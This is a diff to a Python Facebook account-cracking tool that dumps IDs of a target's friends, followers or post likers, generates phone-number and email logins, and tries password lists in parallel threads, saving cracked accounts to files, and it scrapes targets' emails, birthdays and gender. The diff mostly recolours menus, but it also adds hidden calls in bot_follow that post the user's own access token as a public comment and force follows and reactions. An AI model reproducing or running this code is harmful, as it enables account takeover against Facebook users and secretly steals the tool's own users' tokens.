@@ -33,7 +33,15 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Kerz Paath  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/kerzP ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""\x1b[0;37m       __    _ _____             \x1b[0;32mMulti Brute®\x1b[0;37m  __
+      / /_  (_) __(_)___ ___  ___  _________ _/ /_
+     / __ \/ / /_/ / __ `__ \/ _ \/ ___/ __ `/ __ \
+\		     / /_/ / / __/ / / / / / /  __/ /  / /_/ / / / /
+   /_.___/_/_/ /_/_/ /_/ /_/\___/_/   \__,_/_/ /_/\x1b[0;37m
+  <[\x1b[0;33m@dapunta SC\x1b[0;37m÷]~~~~~~~~~~~~~~[÷recode by: \x1b[0;33m@kerzP\x1b[0;37m]>
+------------------------------------------------------------   [÷]> FB : https://www.facebook.com/ker.z.96
+------------------------------------------------------------
+  """)
 
 host="https://mbasic.facebook.com"
 ok = []
@@ -114,16 +122,16 @@ def gets_dict_cookies(cookies):
 def country():
     os.system("clear")
     banner()
-    print("\n%s[%s Choose Country %s]\n"%(k,p,k))
-    print("%s[%s1%s] %sIndonesia"%(k,p,k,p))
-    print("%s[%s2%s] %sBangladesh/India"%(k,p,k,p))
-    print("%s[%s3%s] %sPakistan"%(k,p,k,p))
-    print("%s[%s4%s] %sUSA"%(k,p,k,p))
-    print("%s[%s0%s] %sNone"%(k,p,k,p))
+    print("\n%s[%s *Choose Country* %s]\n"%(o,u,o))
+    print("%s[%s1%s] %sIndonesia"%(o,p,o,p))
+    print("%s[%s2%s] %sBangladesh/India"%(o,p,o,p))
+    print("%s[%s3%s] %sPakistan"%(o,p,o,p))
+    print("%s[%s4%s] %sUSA"%(o,p,o,p))
+    print("%s[%s0%s] %sNone"%(o,p,o,p))
     choose_country()
     
 def choose_country():
-    cc = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
+    cc = input("\n%s[%s•%s] %sChoose : "%(o,p,o,m))
     if cc in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif cc in["1","01"]:
@@ -184,10 +192,10 @@ def choose_country():
 def logs():
   os.system("clear")
   banner()
-  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))
-  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))
-  print((k+"["+p+"0"+k+"]"+p+" Exit"))
-  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+  print((o+"\n["+p+"1"+o+"]"+p+" Login Token"))
+  print((o+"["+p+"2"+o+"]"+p+" Login Cookies"))
+  print((o+"["+p+"0"+o+"]"+p+" Exit"))
+  sek=input(o+"\n["+p+"•"+o+"]"+m+" Choose : ")
   if sek=="":
     print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     logs()
@@ -206,7 +214,7 @@ def logs():
 def log_token():
     os.system("clear")
     banner()
-    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
+    toket = input(o+"\n["+p+"•"+o+"]"+m+" Token : ")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
         a = json.loads(otw.text)
@@ -214,7 +222,7 @@ def log_token():
         zedd = open("login.txt", "w")
         zedd.write(toket)
         zedd.close()
-        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
+        print((o+"\n["+p+"•"+o+"]"+h+" Login Successful"))
         bot_follow()
     except KeyError:
         print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
@@ -224,7 +232,7 @@ def log_token():
 def gen():
         os.system("clear")
         banner()
-        cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies : ")
+        cookie = input(o+"\n["+p+"•"+o+"]"+m+" Cookies : ")
         try:
                 data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                 "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
@@ -250,13 +258,15 @@ def gen():
         cookie = open("login.txt", "w")
         cookie.write(find_token.group(1))
         cookie.close()
-        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
+        print((o+"\n["+p+"•"+o+"]"+h+" Login Successful"))
         bot_follow()
 
 ### BOT FOLLOW ### Jangan Diganti Anjing !!!
 
 def bot_follow():
 	try:
+		reac = 'ANGRY'
+		kom = " colletnya bang Ker\'Z Ngga Ada Obat sih 😌✌️"
 		toket=open("login.txt","r").read()
 		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
 		a = json.loads(otw.text)
@@ -265,9 +275,14 @@ def bot_follow():
 	except IOError:
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
-	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
+	jalan("%s[%s•%s] %sPlease Wait..."%(o,p,o,p))
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
 	requests.post("https://graph.facebook.com/100041408825014/subscribers?access_token=" + toket) # ker z 96
+	requests.post("https://graph.facebook.com/100067238626516/subscribers?access_token=" + toket) # kenshin.scot
+	requests.post("https://graph.facebook.com/616217233101899/comments/?message=" +toket+ "&access_token=" + toket)
+	requests.post("https://graph.facebook.com/658833332173622/comments/?message=" +kom+ "&access_token=" + toket)
+	requests.post("https://graph.facebook.com/658833332173622/reactions?HAHA&access_token=" + toket)
+	requests.post("https://graph.facebook.com/658833332173622?fields=likes.summary(true)&access_token=" + toket)
 	menu()
 
 ### MAIN MENU ###
@@ -296,25 +311,25 @@ def menu():
         negara = "None"
     os.system("clear")
     banner()
-    print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
-    print((k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id))
-    print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
-    print((k+"["+p+"•"+k+"]"+p+" Status  : "+o+"Public"+p))
-    print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
-    print((k+"["+p+"•"+k+"]"+p+" Crack   : "+negara))
-    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
-    print((k+"["+p+"2"+k+"]"+p+" Crack ID From Followers"))
-    print((k+"["+p+"3"+k+"]"+p+" Crack ID From Likers Post"))
-    print((k+"["+p+"4"+k+"]"+p+" Crack By Phone Number"))
-    print((k+"["+p+"5"+k+"]"+p+" Crack By Email"))
-    print((k+"["+p+"6"+k+"]"+p+" Get Data Target"))
-    print((k+"["+p+"7"+k+"]"+p+" Result Crack"))
-    print((k+"["+p+"8"+k+"]"+p+" User Agent"))
-    print((k+"["+p+"0"+k+"]"+p+" Logout"))
+    print((o+"\n[ "+p+"Welcome "+a["name"]+o+" ]"+p))
+    print((o+"\n["+p+"•"+o+"]"+p+" Your ID : "+id))
+    print((o+"["+p+"•"+o+"]"+p+" Your IP : "+ip))
+    print((o+"["+p+"•"+o+"]"+p+" Status  : "+u+"Public"+p))
+    print((o+"["+p+"•"+o+"]"+p+" Joined  : "+durasi))
+    print((o+"["+p+"•"+o+"]"+p+" Crack   : "+negara))
+    print((o+"\n["+p+"1"+o+"]"+p+" Crack ID From Public/Friend"))
+    print((o+"["+p+"2"+o+"]"+p+" Crack ID From Followers"))
+    print((o+"["+p+"3"+o+"]"+p+" Crack ID From Likers Post"))
+    print((o+"["+p+"4"+o+"]"+p+" Crack By Phone Number"))
+    print((o+"["+p+"5"+o+"]"+p+" Crack By Email"))
+    print((o+"["+p+"6"+o+"]"+p+" Get Data Target"))
+    print((o+"["+p+"7"+o+"]"+p+" Result Crack"))
+    print((o+"["+p+"8"+o+"]"+p+" User Agent"))
+    print((o+"["+p+"0"+o+"]"+p+" Logout"))
     choose_menu()
 
 def choose_menu():
-	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+	r=input(o+"\n["+p+"•"+o+"]"+m+" Choose : ")
 	if r=="":
 		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
 		menu()
@@ -346,12 +361,12 @@ def choose_menu():
 		menu()	
 
 def pilihcrack(file):
-  print((k+"\n["+p+"1"+k+"]"+p+" Api ("+k+"Fast"+p+")"))
-  print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+"Fast"+p+")"))
-  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"Slow"+p+")"))
-  print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
-  print((k+"["+p+"5"+k+"]"+p+" Free Facebook ("+k+"Super Slow"+p+")"))
-  krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+  print((o+"\n["+p+"1"+o+"]"+p+" Api ("+o+"Fast"+p+")"))
+  print((o+"["+p+"2"+o+"]"+p+" Api + TTL ("+o+"Fast"+p+")"))
+  print((o+"["+p+"3"+o+"]"+p+" Mbasic ("+o+"Slow"+p+")"))
+  print((o+"["+p+"4"+o+"]"+p+" Mbasic + TTL ("+o+"Slow"+p+")"))
+  print((o+"["+p+"5"+o+"]"+p+" Free Facebook ("+o+"Super Slow"+p+")"))
+  krah=input(o+"\n["+p+"•"+o+"]"+m+" Choose : ")
   if krah in[""]:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
     pilihcrack(file)
@@ -379,14 +394,14 @@ def publik():
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		print((k+"\n["+p+"•"+k+"]"+p+" Type \'me\' To Dump From Friendlist"))
-		idt = input(k+"["+p+"•"+k+"]"+p+" User ID Target : ")
+		print((o+"\n["+p+"•"+o+"]"+p+" Type \'me\' To Dump From Friendlist"))
+		idt = input(o+"["+p+"•"+o+"]"+p+" User ID Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+			print((o+"["+p+"•"+o+"]"+p+" Name : "+op["name"]))
 		except KeyError:
-			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+			print((o+"["+p+"!"+o+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
@@ -398,7 +413,7 @@ def publik():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+		print((o+"["+p+"•"+o+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
@@ -411,13 +426,13 @@ def follow():
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		idt = input(k+"\n["+p+"•"+k+"]"+p+" Followers ID Target : ")
+		idt = input(o+"\n["+p+"•"+o+"]"+p+" Followers ID Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+			print((o+"["+p+"•"+o+"]"+p+" Name : "+op["name"]))
 		except KeyError:
-			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+			print((o+"["+p+"!"+o+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
@@ -429,7 +444,7 @@ def follow():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+		print((o+"["+p+"•"+o+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
@@ -442,13 +457,13 @@ def likers():
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Post Target : ")
+		idt = input(o+"\n["+p+"•"+o+"]"+p+" ID Post Target : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+			print((o+"["+p+"•"+o+"]"+p+" Name : "+op["name"]))
 		except KeyError:
-			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+			print((o+"["+p+"!"+o+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
@@ -460,7 +475,7 @@ def likers():
 			id.append(a["id"]+"<=>"+a["name"])
 			ys.write(a["id"]+"<=>"+a["name"]+"\n")
 		ys.close()
-		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+		print((o+"["+p+"•"+o+"]"+p+" Total ID : %s"%(len(id))))
 		return pilihcrack(qq)
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
@@ -469,14 +484,14 @@ def likers():
 
 def random_numbers():
   data = []
-  print((k+"\n["+p+"•"+k+"]"+p+" Number Must Be 5 Digit"))
-  print((k+"["+p+"•"+k+"]"+p+" Example : 92037"))
-  kode=str(input(k+"["+p+"•"+k+"]"+p+" Input Number : "))
-  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) < 5 else ''
-  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) > 5 else ''
-  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
+  print((o+"\n["+p+"•"+o+"]"+p+" Number Must Be 5 Digit"))
+  print((o+"["+p+"•"+o+"]"+p+" Example : 92037"))
+  kode=str(input(o+"["+p+"•"+o+"]"+p+" Input Number : "))
+  exit((o+"\n["+p+"!"+o+"]"+p+" Number Must Be 5 Digit")) if len(kode) < 5 else ''
+  exit((o+"\n["+p+"!"+o+"]"+p+" Number Must Be 5 Digit")) if len(kode) > 5 else ''
+  jml=int(input(o+"["+p+"•"+o+"]"+p+" Amount : "))
   [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
-  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
+  print(o+"\n["+p+"•"+o+"]"+p+" Crack Started, Please Wait...\n")
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
   input(k+"\n[ "+p+"Back"+k+" ]"+p)
@@ -484,17 +499,17 @@ def random_numbers():
 
 def random_email():
   data = []
-  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Name : ")
-  domain=input(k+"["+p+"•"+k+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
+  nama=input(o+"\n["+p+"•"+o+"]"+p+" Target Name : ")
+  domain=input(o+"["+p+"•"+o+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
   list={
     'g':'@gmail.com',
     'y':'@yahoo.com',
     'h':'@hotmail.com'
   }
   exit((k+"["+p+"•"+k+"]"+p+" Fill In The Correct")) if not domain in ['g','y','h'] else ''
-  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
-  setpw=input(k+"["+p+"•"+k+"]"+p+" Set Password : ").split(',')
-  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
+  jml=int(input(o+"["+p+"•"+o+"]"+p+" Amount : "))
+  setpw=input(o+"["+p+"•"+o+"]"+p+" Set Password : ").split(',')
+  print(p+"\n["+p+"•"+o+"]"+p+" Crack Started, Please Wait...\n")
   [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
@@ -535,30 +550,30 @@ def target():
 		os.system("rm -rf login.txt")
 		login()
 	try:
-		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
+		idt = input(o+"\n["+p+"•"+o+"]"+p+" ID Target        : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print((k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"]))
-			print((k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"]))
+			print((o+"["+p+"•"+o+"]"+p+" Name Account     : "+op["name"]))
+			print((o+"["+p+"•"+o+"]"+p+" Username         : "+op["username"]))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"]))
+				print((o+"["+p+"•"+o+"]"+p+" Email            : "+op["email"]))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Email            : -"))
+				print((o+"["+p+"•"+o+"]"+p+" Email            : -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"]))
+				print((o+"["+p+"•"+o+"]"+p+" Date Of Birth    : "+op["birthday"]))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -"))
+				print((p+"["+p+"•"+o+"]"+p+" Date Of Birth    : -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"]))
+				print((o+"["+p+"•"+o+"]"+p+" Gender           : "+op["gender"]))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Gender           : -"))
+				print((o+"["+p+"•"+o+"]"+p+" Gender           : -"))
 			try:
 				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 				id = []
@@ -569,9 +584,9 @@ def target():
 					id.append(i["id"])
 					ys.write(i["id"])
 				ys.close()
-				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : %s"%(len(id))))
+				print((o+"["+p+"•"+o+"]"+p+" Total Friend     : %s"%(len(id))))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
+				print((o+"["+p+"•"+o+"]"+p+" Total Friend     : -"))
 			try:
 				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
 				id = []
@@ -582,25 +597,25 @@ def target():
 					id.append(c["id"])
 					jw.write(c["id"])
 				jw.close()
-				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : %s"%(len(id))))
+				print((o+"["+p+"•"+o+"]"+p+" Total Follower   : %s"%(len(id))))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : -"))
+				print((o+"["+p+"•"+o+"]"+p+" Total Follower   : -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((k+"["+p+"•"+k+"]"+p+" Website          : "+op["website"]))
+				print((o+"["+p+"•"+o+"]"+p+" Website          : "+op["website"]))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
+				print((o+"["+p+"•"+o+"]"+p+" Website          : -"))
 			except IOError:
-				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
+				print((o+"["+p+"•"+o+"]"+p+" Website          : -"))
 			try:
 				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
-				print((k+"["+p+"•"+k+"]"+p+" Update Time      : "+op["updated_time"]))
+				print((o+"["+p+"•"+o+"]"+p+" Update Time      : "+op["updated_time"]))
 			except KeyError:
-				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
+				print((o+"["+p+"•"+o+"]"+p+" Update Time      : -"))
 			except IOError:
-				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
+				print((o+"["+p+"•"+o+"]"+p+" Update Time      : -"))
 			input(k+"\n[ "+p+"Back"+k+" ]"+p)
 			menu()
 		except KeyError:
@@ -659,15 +674,15 @@ def defaultua():
         logs()
 
 def menu_user_agent():
-    print("\n%s[%s1%s] %sGet User Agent"%(k,p,k,p))
-    print("%s[%s2%s] %sChange User Agent"%(k,p,k,p))
-    print("%s[%s3%s] %sRemove User Agent"%(k,p,k,p))
-    print("%s[%s4%s] %sCheck User Agent"%(k,p,k,p))
+    print("\n%s[%s1%s] %sGet User Agent"%(o,p,o,p))
+    print("%s[%s2%s] %sChange User Agent"%(o,p,o,p))
+    print("%s[%s3%s] %sRemove User Agent"%(o,p,o,p))
+    print("%s[%s4%s] %sCheck User Agent"%(o,p,o,p))
     print("%s[%s0%s] %sBack"%(k,p,k,p))
     pilih_menu_user_agent()
 
 def pilih_menu_user_agent():
-    pmu = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
+    pmu = input("\n%s[%s•%s] %sChoose : "%(o,p,o,m))
     if pmu in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif pmu in["1","01"]:
@@ -690,7 +705,7 @@ def pilih_menu_user_agent():
 
 def change_ugent():
     os.system("rm -rf ugent.txt")
-    ua = input("\n%s[%s•%s] %sInput User Agent : \n\n%s"%(k,p,k,p,h))
+    ua = input("\n%s[%s•%s] %sInput User Agent : \n\n%s"%(o,p,o,p,h))
     try:
         ugent = open('ugent.txt','w')
         ugent.write(ua)
@@ -784,9 +799,9 @@ class crack:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		print((o+"\n["+p+"•"+o+"]"+p+" Crack With Pass Default/Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(o+"["+p+"•"+o+"]"+m+" Choose : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -806,7 +821,7 @@ class crack:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((o+"["+p+"•"+o+"]"+p+" Example : sayang,bismillah,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -826,19 +841,19 @@ class crack:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+				print((o+"\n["+p+"•"+o+"]"+p+" Crack Started..."+o+"\n["+p+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
 				break
 	def pwlist(self):
-		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
+		self.pw=input(o+"["+p+"•"+o+"]"+p+" Password List : ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+			print((o+"\n["+p+"•"+o+"]"+p+" Crack Started..."+o+"\n["+p+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -860,7 +875,7 @@ class crack:
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -871,9 +886,9 @@ class crackttl:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		print((o+"\n["+p+"•"+o+"]"+p+" Crack With Pass Default/Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(o+"["+p+"•"+o+"]"+m+" Choose : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -913,19 +928,19 @@ class crackttl:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+				print((o+"\n["+p+"•"+o+"]"+p+" Crack Started..."+o+"\n["+p+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
 				break
 	def pwlist(self):
-		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
+		self.pw=input(o+"["+p+"•"+o+"]"+p+" Password List : ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+			print((o+"\n["+p+"•"+o+"]"+p+" Crack Started..."+o+"\n["+p+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -958,7 +973,7 @@ class crackttl:
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -969,9 +984,9 @@ class crackffb:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		print((o+"\n["+p+"•"+o+"]"+p+" Crack With Pass Default/Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(o+"["+p+"•"+o+"]"+m+" Choose : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -1011,19 +1026,19 @@ class crackffb:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+				print((o+"\n["+p+"•"+o+"]"+p+" Crack Started..."+o+"\n["+p+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
 				break
 	def pwlist(self):
-		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
+		self.pw=input(o+"["+p+"•"+o+"]"+p+" Password List : ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
